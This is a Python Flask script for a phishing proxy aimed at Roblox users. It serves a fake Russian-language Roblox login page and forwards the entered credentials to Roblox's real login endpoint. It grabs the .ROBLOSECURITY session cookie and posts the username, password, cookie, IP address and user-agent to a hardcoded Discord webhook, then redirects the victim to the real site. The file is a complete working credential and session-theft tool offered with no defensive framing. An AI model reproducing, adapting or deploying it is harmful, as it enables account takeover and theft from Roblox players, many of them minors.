from flask import Flask, request, render_template_string, jsonify
import requests
import json
import datetime
import os

app = Flask(__name__)

DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1538073991938445353/xa-WZkoA0pDAoLwzHmNwTGTcjU0XFZYDc_9ZrGCsckpxGQX_y-yMWIPikI3ZyfvN4FK_'

ROBLOX_LOGIN_URL = 'https://auth.roblox.com/v2/login'

stolen_sessions = []

def send_to_discord(username, password, cookie, ip, user_agent):
    payload = {
        'embeds': [{
            'title': '🎮 НОВЫЙ РОБЛОКС АККАУНТ!',
            'color': 0x00ff00,
            'fields': [
                {'name': '👤 Логин', 'value': f'```{username}```', 'inline': True},
                {'name': '🔑 Пароль', 'value': f'```{password}```', 'inline': True},
                {'name': '🍪 РОБЛОКС КУКИ', 'value': f'```{cookie}```', 'inline': False},
                {'name': '🌐 IP', 'value': f'```{ip}```', 'inline': True},
                {'name': '📱 User-Agent', 'value': f'```{user_agent}```', 'inline': False}
            ],
            'footer': {'text': 'Roblox Proxy Grabber'}
        }]
    }
    try:
        requests.post(DISCORD_WEBHOOK, json=payload)
    except:
        pass

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Roblox - Вход</title>
        <style>
            body { background: #191919; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-box { background: #232323; padding: 40px; border-radius: 10px; width: 350px; text-align: center; }
            .roblox-logo { color: white; font-size: 32px; font-weight: bold; margin-bottom: 30px; }
            input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #444; border-radius: 5px; background: #333; color: white; font-size: 16px; }
            button { width: 100%; padding: 12px; background: #00b06f; color: white; border: none; border-radius: 5px; font-size: 18px; font-weight: bold; cursor: pointer; }
            .error { color: #ff4444; margin-top: 10px; display: none; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="roblox-logo">ROBLOX</div>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Имя пользователя" required>
                <input type="password" id="password" placeholder="Пароль" required>
                <button type="submit">Войти</button>
            </form>
            <div class="error" id="error">Неверный логин или пароль</div>
        </div>
        <script>
            document.getElementById('loginForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                const res = await fetch('/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({username, password})
                });
                const data = await res.json();
                if (data.success) {
                    window.location.href = 'https://www.roblox.com';
                } else {
                    document.getElementById('error').style.display = 'block';
                }
            });
        </script>
    </body>
    </html>
    '''

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username', '')
    password = data.get('password', '')
    
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', '')
    
    headers = {
        'User-Agent': user_agent,
        'Content-Type': 'application/json',
        'Referer': 'https://www.roblox.com/',
        'Origin': 'https://www.roblox.com'
    }
    
    payload = {'ctype': 'Username', 'cvalue': username, 'password': password}
    
    try:
        response = requests.post(ROBLOX_LOGIN_URL, json=payload, headers=headers)
        
        if response.status_code == 200:
            roblox_cookie = ''
            if '.ROBLOSECURITY' in response.cookies:
                roblox_cookie = response.cookies['.ROBLOSECURITY']
            elif 'set-cookie' in response.headers:
                for cookie in response.headers.getlist('set-cookie'):
                    if '.ROBLOSECURITY' in cookie:
                        roblox_cookie = cookie.split(';')[0].replace('.ROBLOSECURITY=', '')
            
            if roblox_cookie:
                send_to_discord(username, password, roblox_cookie, client_ip, user_agent)
                return jsonify({'success': True})
        
        return jsonify({'success': False})
    except:
        return jsonify({'success': False})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
